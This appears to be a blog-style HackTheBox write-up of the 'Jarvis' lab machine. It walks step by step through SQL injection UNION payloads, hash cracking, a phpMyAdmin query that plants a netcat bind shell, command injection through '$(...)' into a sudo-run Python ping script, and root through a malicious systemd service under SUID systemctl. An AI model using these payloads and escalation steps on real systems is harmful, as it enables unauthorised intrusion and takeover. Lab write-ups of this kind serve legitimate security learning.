---
title: Jarvis
categories:
  - HackTheBox
tags: 
  - Infosec,
  - Exploit
  - Web
date: 2020-01-08
---

As always, run an nmap scan:

```
 $ nmap -A 10.10.10.135
	PORT   STATE SERVICE VERSION
	22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
	80/tcp open  http    Apache httpd 2.4.25 ((Debian))
	|_http-title: Stark Hotel
```
(trimmed)

Looking at the web server available, it's a simple listing page for a hotel. When you click a room, it takes you to `/room.php?cod=x` where x is presumably the room ID.

If you replace x with a string or an invalid id, the same page returns but all fields are blank. You can do a quick test for SQL injection with the following request:

```
GET /room.php?cod=999 OR 1=1;#
```

999 is an invalid ID (we assume), but we still get a room returned and shown to us, meaning this is vulnerable.

Since we're shown whatever the first row returned is, a `UNION select` should let us view any data we want with the right conditions. First, we need to match up the right amount of columns.

```
GET /room.php?cod=999 UNION SELECT 1,1,1,1; #
GET /room.php?cod=999 UNION SELECT 1,1,1,1,1; #
GET /room.php?cod=999 UNION SELECT 1,1,1,1,1,1; #
GET /room.php?cod=999 UNION SELECT 1,1,1,1,1,1,1; #
^^^ this one works
```

We get a similar page, but the price, name etc is all 1. Let's start by enumerating the databases:

```
GET /room.php?cod=0 UNION SELECT 1,GROUP_CONCAT(schema_name),1,1,1,1,1 FROM information_schema.schemata; #
```

For me, this set the name of the room to `aaa,hotel,information_schema,mysql,performance_schema`. We miss the first column because the id isn't directly visible in our page, and though it is reflected back at us through the image URL, it's easier to have it shown directly. `aaa` is a weird name, so it's probably someone else and not part of the box. It's safe to say the `hotel` database drives this website.

We can now start to look at the tables in our database:

```
GET /room.php?cod=0 UNION SELECT 1,GROUP_CONCAT(TABLE_NAME),1,1,1,1,1 FROM information_schema.tables; #
```

This gives us `room,ALL_PLUGINS,APPLICABLE_ROLES,CHARACTER_SETS...`. So it looks like our database is just the one table and then the default mysql stuff.

What might be more useful though, is some credentials. We can access the `mysql.users` table just like any other, and dump the first username and password hash:

```
GET /room.php?cod=0 UNION SELECT 1,User,Password,1,1,1,1 FROM mysql.user; #
```

All this could've been done much more easily using `sqlmap`, but it's good to do it yourself sometimes. From this, we get something we can throw into john, or any other tool:

```
DBadmin:*2D2B7A5E4E637B8FBA1D17F40318F277D29964D0
```

```
 $ john passwd
	Loaded 1 password hash (mysql-sha1, MySQL 4.1+ [SHA1 128/128 SSE2 4x])
	Proceeding with single, rules:Single
	Press 'q' or Ctrl-C to abort, almost any other key for status
	Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist
	
	imissyou         (DBadmin)
	
	1g 0:00:00:00 DONE 2/3 (2019-09-14 20:50) 1.960g/s 6617p/s 6617c/s 6617C/s twilight..ashlee
	Use the "--show" option to display all of the cracked passwords reliably
	Session completed
```

(trimmed)

For context, the hash is in a format particular to MySql > 4.1, with the * being used to specify that it's a newer version.

Now what? Well, whether you run dirb on the web root or just guess you should quickly find the phpMyAdmin installation which we can now access.

Now we need to get actual code execution. From the phpMyAdmin root, you can find a `README.md` file which states that it's running version 4.8.0. We can easily search for exploits and find [this](https://blog.vulnspy.com/2018/06/21/phpMyAdmin-4-8-x-Authorited-CLI-to-RCE/) very well written guide. We could make a metasploit payload, and in most real-world situations we'd need to, but we can also try a much simpler approach:

```
select "<?php echo exec('nc -lvp 4444 -e /bin/bash'); ?>"
```

This will create a bash shell bound to port 4444. Run it and sure enough, we can connect.

```
 $ whoami
	www-data
 $ cat /etc/passwd
	root:x:0:0:root:/root:/bin/bash
	www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
	pepper:x:1000:1000:,,,:/home/pepper:/bin/bash
	(trimmed)
```

So while we have *a* shell, it's likely pepper is the real user target. Let's do our normal enum of processes:

```
 $ ps -aux
 	USER        PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
	root          1  0.2  0.6 138984  6820 ?        Ss   15:39   0:08 /sbin/init
	root        562  0.0  2.5 271396 25648 ?        Ss   15:39   0:00 /usr/sbin/apache2 -k start
	www-data    917  0.0  0.3  18228  3376 pts/0    Ss+  15:45   0:00 /bin/bash
	root       1027  0.0  0.3  47608  3204 ?        S    16:02   0:00 sudo -u pepper /var/www/Admin-Utilities/simpler.py -p
	pepper     1028  0.0  0.9  26040  9128 ?        S    16:02   0:00 python3 /var/www/Admin-Utilities/simpler.py -p
	www-data   2203  0.0  0.0   4276   768 ?        S    16:26   0:00 sh -c nc -lvp 4444 -e /bin/bash
	www-data   2204  0.0  0.2  17940  2840 ?        S    16:26   0:00 bash
	www-data   2312  0.0  0.2  36632  2856 ?        R    16:27   0:00 ps -aux
```

(trimmed)

We see everything we'd expect: kernel threads, the http server and the shell we're on, but also a call to sudo which runs this python script as a target. Here's the source for that script:

```python
#!/usr/bin/env python3
from datetime import datetime
import sys
import os
from os import listdir
import re

def show_help():
    message='''
********************************************************
* Simpler   -   A simple simplifier ;)                 *
* Version 1.0                                          *
********************************************************
Usage:  python3 simpler.py [options]

Options:
    -h/--help   : This help
    -s          : Statistics
    -l          : List the attackers IP
    -p          : ping an attacker IP
    '''
    print(message)

def show_header():
    print('''***********************************************
     _                 _                       
 ___(_)_ __ ___  _ __ | | ___ _ __ _ __  _   _ 
/ __| | '_ ` _ \| '_ \| |/ _ \ '__| '_ \| | | |
\__ \ | | | | | | |_) | |  __/ |_ | |_) | |_| |
|___/_|_| |_| |_| .__/|_|\___|_(_)| .__/ \__, |
                |_|               |_|    |___/ 
                                @ironhackers.es
                                
***********************************************
''')

def show_statistics():
    path = '/home/pepper/Web/Logs/'
    print('Statistics\n-----------')
    listed_files = listdir(path)
    count = len(listed_files)
    print('Number of Attackers: ' + str(count))
    level_1 = 0
    dat = datetime(1, 1, 1)
    ip_list = []
    reks = []
    ip = ''
    req = ''
    rek = ''
    for i in listed_files:
        f = open(path + i, 'r')
        lines = f.readlines()
        level2, rek = get_max_level(lines)
        fecha, requ = date_to_num(lines)
        ip = i.split('.')[0] + '.' + i.split('.')[1] + '.' + i.split('.')[2] + '.' + i.split('.')[3]
        if fecha > dat:
            dat = fecha
            req = requ
            ip2 = i.split('.')[0] + '.' + i.split('.')[1] + '.' + i.split('.')[2] + '.' + i.split('.')[3]
        if int(level2) > int(level_1):
            level_1 = level2
            ip_list = [ip]
            reks=[rek]
        elif int(level2) == int(level_1):
            ip_list.append(ip)
            reks.append(rek)
        f.close()
	
    print('Most Risky:')
    if len(ip_list) > 1:
        print('More than 1 ip found')
    cont = 0
    for i in ip_list:
        print('    ' + i + ' - Attack Level : ' + level_1 + ' Request: ' + reks[cont])
        cont = cont + 1
	
    print('Most Recent: ' + ip2 + ' --> ' + str(dat) + ' ' + req)
	
def list_ip():
    print('Attackers\n-----------')
    path = '/home/pepper/Web/Logs/'
    listed_files = listdir(path)
    for i in listed_files:
        f = open(path + i,'r')
        lines = f.readlines()
        level,req = get_max_level(lines)
        print(i.split('.')[0] + '.' + i.split('.')[1] + '.' + i.split('.')[2] + '.' + i.split('.')[3] + ' - Attack Level : ' + level)
        f.close()

def date_to_num(lines):
    dat = datetime(1,1,1)
    ip = ''
    req=''
    for i in lines:
        if 'Level' in i:
            fecha=(i.split(' ')[6] + ' ' + i.split(' ')[7]).split('\n')[0]
            regex = '(\d+)-(.*)-(\d+)(.*)'
            logEx=re.match(regex, fecha).groups()
            mes = to_dict(logEx[1])
            fecha = logEx[0] + '-' + mes + '-' + logEx[2] + ' ' + logEx[3]
            fecha = datetime.strptime(fecha, '%Y-%m-%d %H:%M:%S')
            if fecha > dat:
                dat = fecha
                req = i.split(' ')[8] + ' ' + i.split(' ')[9] + ' ' + i.split(' ')[10]
    return dat, req
			
def to_dict(name):
    month_dict = {'Jan':'01','Feb':'02','Mar':'03','Apr':'04', 'May':'05', 'Jun':'06','Jul':'07','Aug':'08','Sep':'09','Oct':'10','Nov':'11','Dec':'12'}
    return month_dict[name]
	
def get_max_level(lines):
    level=0
    for j in lines:
        if 'Level' in j:
            if int(j.split(' ')[4]) > int(level):
                level = j.split(' ')[4]
                req=j.split(' ')[8] + ' ' + j.split(' ')[9] + ' ' + j.split(' ')[10]
    return level, req
	
def exec_ping():
    forbidden = ['&', ';', '-', '`', '||', '|']
    command = input('Enter an IP: ')
    for i in forbidden:
        if i in command:
            print('Got you')
            exit()
    os.system('ping ' + command)

if __name__ == '__main__':
    show_header()
    if len(sys.argv) != 2:
        show_help()
        exit()
    if sys.argv[1] == '-h' or sys.argv[1] == '--help':
        show_help()
        exit()
    elif sys.argv[1] == '-s':
        show_statistics()
        exit()
    elif sys.argv[1] == '-l':
        list_ip()
        exit()
    elif sys.argv[1] == '-p':
        exec_ping()
        exit()
    else:
        show_help()
        exit()
```

We see the -p flag, which our sudo process was using, passes input to a command. Whilst it may filter out some characters, it's still vulnerable to command injection.

We setup a simple bind shell as `/tmp/mal.sh`:

```
nc -lvp 5555 -e /bin/bash
```

```
 $ sudo -u pepper python ./simpler.py -p
 	Enter an IP: $(/tmp/mal.sh)
	<hangs>
```

Now we can connect to port 5555 and login as pepper, giving us our user flag. 

Next, I added my ssh key to `~/.ssh/authorized_keys` to give me a proper SSH session, meaning editors, etc will work.

We've already looked through the processes before so it's unlikely to help us, we can look for SID bits though:

```
 $ find / -perm -4000 -print 2> /dev/null
	/bin/fusermount
	/bin/mount
	/bin/ping
	/bin/systemctl
	/bin/umount
	/bin/su
	/usr/bin/newgrp
	/usr/bin/passwd
	/usr/bin/gpasswd
	/usr/bin/chsh
	/usr/bin/sudo
	/usr/bin/chfn
	/usr/lib/eject/dmcrypt-get-device
	/usr/lib/openssh/ssh-keysign
	/usr/lib/dbus-1.0/dbus-daemon-launch-helper
```

The only odd one we see here is systemctl. This is used to control the systemd init system, which handles starting almost everything on the system, including managing long-running daemons.
Giving it an SUID bit means that anyone can control all parts of the init system. This gives us an easy path to root: We make a .service file that gives us a shell, then link it and ask systemctl to run it as a system process, ie as root:

```
 $ cat mal.service
 	[Service]
	ExecStart=/bin/bash -c "nc -lvp 6666 -e /bin/bash"
 $ systemctl link /home/pepper/mal.service
	Created symlink /etc/systemd/system/mal.service → /home/pepper/mal.service.
 $ systemctl start mal.service
```

We now have a root shell and can read the flag!
